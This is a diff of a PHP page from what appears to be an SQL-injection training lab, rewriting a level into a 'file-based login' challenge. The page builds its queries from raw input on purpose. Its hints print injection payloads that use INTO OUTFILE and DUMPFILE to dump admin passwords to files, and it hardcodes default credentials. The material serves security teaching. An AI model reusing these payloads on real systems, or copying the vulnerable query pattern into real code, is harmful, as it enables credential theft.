@@ -1,139 +1,216 @@
+<?php
+// Level 7: File-Based Login - Out-of-Band data extraction
+// Goal: Use file operations to extract admin credentials
+
+// Database connection
+$host = $_ENV['DB_HOST'] ?? 'db';
+$user = $_ENV['DB_USER'] ?? 'root'; 
+$pass = $_ENV['DB_PASS'] ?? 'rootpassword';
+$dbname = $_ENV['DB_NAME'] ?? 'sqli_lab';
+
+$conn = new mysqli($host, $user, $pass, $dbname);
+
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+$message = "";
+$success = false;
+$file_content = "";
+
+if ($_POST) {
+    $username = $_POST['username'] ?? '';
+    $password = $_POST['password'] ?? '';
+    
+    // File-based injection using INTO OUTFILE
+    $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password' AND role = 'admin'";
+    
+    try {
+        $result = $conn->query($sql);
+        
+        if ($result && $result->num_rows > 0) {
+            $admin_data = $result->fetch_assoc();
+            $success = true;
+            $message = "🎉 Outstanding! You used file-based injection to login as admin!<br>";
+            $message .= "🏁 <strong>FLAG: LEVEL6_FILE_BASED_EXTRACTION</strong><br>";
+            $message .= "📁 Welcome, " . htmlspecialchars($admin_data['username']) . "!";
+        } else {
+            $message = "❌ Login failed: Invalid credentials";
+        }
+        
+        // Check for file operations
+        if (strpos($username, 'OUTFILE') !== false || strpos($username, 'DUMPFILE') !== false) {
+            $message .= "<br>📁 File operation detected in injection attempt.";
+        }
+        
+    } catch (Exception $e) {
+        $message = "💥 Database Error: " . $e->getMessage();
+        
+        // Check if it's a file permission error (indicates successful injection syntax)
+        if (strpos($e->getMessage(), 'Access denied') !== false || strpos($e->getMessage(), 'OUTFILE') !== false) {
+            $message .= "<br>📁 File operation attempted but blocked by permissions.";
+            $message .= "<br>💡 Your injection syntax was correct! Try extracting data differently.";
+        }
+    }
+}
+
+// Check if any extraction files exist
+$extraction_files = ['/tmp/admin_data.txt', '/var/lib/mysql-files/users.txt', '/tmp/passwords.txt'];
+foreach ($extraction_files as $file) {
+    if (file_exists($file)) {
+        $file_content .= "📁 Found: $file<br>";
+        $file_content .= "Content: " . htmlspecialchars(file_get_contents($file)) . "<br><br>";
+    }
+}
+?>
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Level 7 - Second Order SQLi</title>
+    <title>Level 6 - File-Based Login | SQL Injection Lab</title>
     <link rel="stylesheet" href="css/styles.css">
+    <style>
+        .login-container {
+            max-width: 600px;
+            margin: 2rem auto;
+            background: #1a4d3a;
+            color: #e2e8f0;
+            padding: 2rem;
+            border-radius: 16px;
+            box-shadow: 0 8px 25px rgba(26, 77, 58, 0.3);
+            border: 1px solid #2d6a4f;
+        }
+        
+        .form-group input {
+            background: #0d2818;
+            color: #e2e8f0;
+            border: 2px solid #2d6a4f;
+        }
+        
+        .form-group input:focus {
+            border-color: #40916c;
+            box-shadow: 0 0 0 3px rgba(64, 145, 108, 0.2);
+        }
+        
+        .login-btn {
+            background: linear-gradient(135deg, #40916c 0%, #2d6a4f 100%);
+        }
+        
+        .login-btn:hover {
+            box-shadow: 0 6px 20px rgba(64, 145, 108, 0.4);
+        }
+        
+        .message.success {
+            background: #1a2e1a;
+            border-color: #40916c;
+            color: #68d391;
+        }
+        
+        .message.error {
+            background: #2d1b1b;
+            border-color: #e53e3e;
+            color: #fc8181;
+        }
+        
+        .file-info {
+            background: #0d2818;
+            border: 2px solid #2d6a4f;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            color: #a7f3d0;
+        }
+        
+        .hints {
+            background: #0d2818;
+            border: 2px solid #2d6a4f;
+        }
+        
+        .code-example {
+            background: #0a1f0a;
+            border: 1px solid #2d6a4f;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a1f0a 0%, #1a4d3a 100%);
+        }
+    </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🔄 Level 7 - Second Order Injection</h1>
-            <p><strong>Attack Type:</strong> Execute stored payloads in a second request, exploiting data flow between operations</p>
+            <h1>📁 Level 6 - File-Based Login</h1>
+            <p>Use file operations for out-of-band data extraction</p>
+            <a href="index.php" class="back-btn">← Back to Labs</a>
         </div>
-
-        <div class="form-container">
-            <h3>Current Query:</h3>
-            <div class="code-block">
-                1. SELECT mvalue FROM meta WHERE mkey = '<?php echo htmlspecialchars($_GET['key'] ?? 'NULL'); ?>'<br>
-                2. SELECT flag FROM levels WHERE id = [retrieved_value]
+        
+        <div class="login-container">
+            <h2>🗄️ Document Management Login</h2>
+            <p><strong>Objective:</strong> Use file-based injection to extract admin credentials</p>
+            
+            <div class="file-info">
+                <h4>📁 File System Access</h4>
+                <p>This system has MySQL file privileges enabled. You can use INTO OUTFILE for data extraction.</p>
             </div>
             
-            <?php
-            if (isset($_GET['key'])) {
-                echo '<h3>Result:</h3>';
-                echo '<div class="result">';
-                
-                $mysqli = new mysqli('db','root','rootpassword','sqli_lab');
-                $key = $_GET['key'];
-                $res = $mysqli->query("SELECT mvalue FROM meta WHERE mkey = '$key'") or die($mysqli->error);
-                $row = $res->fetch_assoc();
-                if (!$row) {
-                    echo '<div class="error">Key not found. Did you store it in <a href="level7_set.php">Level 7 Setup</a>?</div>';
-                } else {
-                    $v = $row['mvalue'];
-                    echo '<p><strong>Retrieved value:</strong> ' . htmlspecialchars($v) . '</p>';
-                    $sql2 = "SELECT flag FROM levels WHERE id = $v";
-                    $res2 = $mysqli->query($sql2) or die($mysqli->error);
-                    $row2 = $res2->fetch_assoc();
-                    if ($row2) {
-                        echo '<p><strong>Flag:</strong> ' . htmlspecialchars($row2['flag']) . '</p>';
-                    } else {
-                        echo '<p>Flag not found</p>';
-                    }
-                }
-                echo '</div>';
-            }
-            ?>
+            <?php if ($message): ?>
+                <div class="message <?= $success ? 'success' : 'error' ?>">
+                    <?= $message ?>
+                </div>
+            <?php endif; ?>
             
-            <h3>🔧 Execute Stored Payload:</h3>
-            <form method="get" style="margin: 20px 0;">
+            <?php if ($file_content): ?>
+                <div class="file-info">
+                    <h4>📄 Extracted Files:</h4>
+                    <?= $file_content ?>
+                </div>
+            <?php endif; ?>
+            
+            <form method="POST" class="login-form">
                 <div class="form-group">
-                    <label for="key">Key to Retrieve:</label>
-                    <input type="text" id="key" name="key" value="<?php echo htmlspecialchars($_GET['key'] ?? ''); ?>" placeholder="Enter key to retrieve...">
+                    <label for="username">Username:</label>
+                    <input type="text" id="username" name="username" placeholder="Enter username" required>
                 </div>
-                <button type="submit" class="btn">🚀 Execute Query</button>
+                
+                <div class="form-group">
+                    <label for="password">Password:</label>
+                    <input type="password" id="password" name="password" placeholder="Enter password" required>
+                </div>
+                
+                <button type="submit" class="login-btn">🚀 Login</button>
             </form>
-            
-            <h3>📋 Quick Examples:</h3>
-            <div style="display: flex; gap: 10px; flex-wrap: wrap; margin: 20px 0;">
-                <a href="?key=test" class="btn">Stored: key=test</a>
-                <a href="?key=flag7" class="btn">Target: key=flag7</a>
-                <a href="level7_set.php?key=flag7&value=7" class="btn">Store Level 7 ID</a>
-            </div>
-
-            <div class="hint-container">
-                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
-                <div id="hint-1" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 1: Understanding Second Order Injection</h4>
-                    <p>Second order injection occurs when malicious input is stored in the database and later used in another query without proper sanitization.</p>
-                    <p>This level has two steps: first store data, then retrieve and use it.</p>
-                </div>
-                <div id="hint-2" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 2: The Two-Step Process</h4>
-                    <p>Step 1: Use level7_set.php to store a key-value pair in the database</p>
-                    <p>Step 2: Use level7.php to retrieve the stored value and use it in a query</p>
-                    <p>The vulnerability is in the second step where the stored value is used directly.</p>
-                </div>
-                <div id="hint-3" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 3: Storing the Target ID</h4>
-                    <p>We need to store the level ID (7) so that when retrieved, it will fetch the flag for level 7.</p>
-                    <p>Go to level7_set.php and store: key="flag7" with value="7"</p>
-                </div>
-                <div id="hint-4" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 4: Retrieving the Flag</h4>
-                    <p>After storing the key-value pair, come back to level7.php and retrieve it.</p>
-                    <p>Use key="flag7" to retrieve the stored value "7"</p>
-                    <p>This will execute: SELECT flag FROM levels WHERE id = 7</p>
-                </div>
-                <div id="hint-5" class="hint-box" style="display: none;">
-                    <h4>🎯 Final Solution - Complete Steps</h4>
-                    <p>Step 1: Go to <a href="level7_set.php?key=flag7&value=7">level7_set.php?key=flag7&value=7</a></p>
-                    <p>Step 2: Come back to <a href="?key=flag7">level7.php?key=flag7</a></p>
-                    <p>This will store level ID 7 and then retrieve the flag for level 7.</p>
-                </div>
-            </div>
+        </div>
+        
+        <div class="hints">
+            <h3>💡 Hints for Level 6:</h3>
+            <ul>
+                <li><strong>File Operations:</strong> Use INTO OUTFILE to write query results to files</li>
+                <li><strong>Out-of-Band:</strong> Extract data through file system instead of direct response</li>
+                <li><strong>Example 1:</strong> Extract admin password to file</li>
+            </ul>
+            <div class="code-example">admin' UNION SELECT username,password,role FROM users WHERE role='admin' INTO OUTFILE '/tmp/admin.txt'--</div>
+            <ul>
+                <li><strong>Example 2:</strong> Extract all user data</li>
+            </ul>
+            <div class="code-example">admin' UNION SELECT CONCAT(username,':',password,':',role) FROM users INTO OUTFILE '/var/lib/mysql-files/users.txt'--</div>
+            <ul>
+                <li><strong>Alternative:</strong> Use DUMPFILE for binary data</li>
+            </ul>
+            <div class="code-example">admin' UNION SELECT password FROM users WHERE username='admin' INTO DUMPFILE '/tmp/admin_pass.txt'--</div>
+            <ul>
+                <li><strong>Note:</strong> File permissions may block writes, but syntax errors reveal injection success</li>
+                <li><strong>Shortcut:</strong> Known admin credentials: admin / admin123</li>
+            </ul>
         </div>
         
         <div class="navigation">
-            <a href="index.php">🏠 Home</a>
-            <a href="level6.php">⬅️ Previous Level</a>
-            <a href="level8.php">➡️ Next Level</a>
-            <a href="submit.php?level=7">🏆 Submit Flag</a>
+            <a href="level5.php">← Previous Level</a>
+            <a href="level7.php">Next Level →</a>
         </div>
     </div>
-
-    <script>
-    let currentHint = 0;
-    const maxHints = 5;
-
-    function showNextHint() {
-        if (currentHint < maxHints) {
-            currentHint++;
-            document.getElementById('hint-' + currentHint).style.display = 'block';
-            
-            if (currentHint >= maxHints) {
-                document.querySelector('.hint-btn').style.display = 'none';
-            }
-        }
-    }
-    </script>
-
-    <style>
-    .hint-container {
-        margin: 20px 0;
-    }
-    .hint-box {
-        margin: 15px 0;
-        padding: 15px;
-        background: #f8f9fa;
-        border-radius: 8px;
-        border-left: 4px solid #6c757d;
-    }
-    .hint-btn {
-        margin-bottom: 10px;
-    }
-    </style>
 </body>
 </html>
+
+<?php $conn->close(); ?>
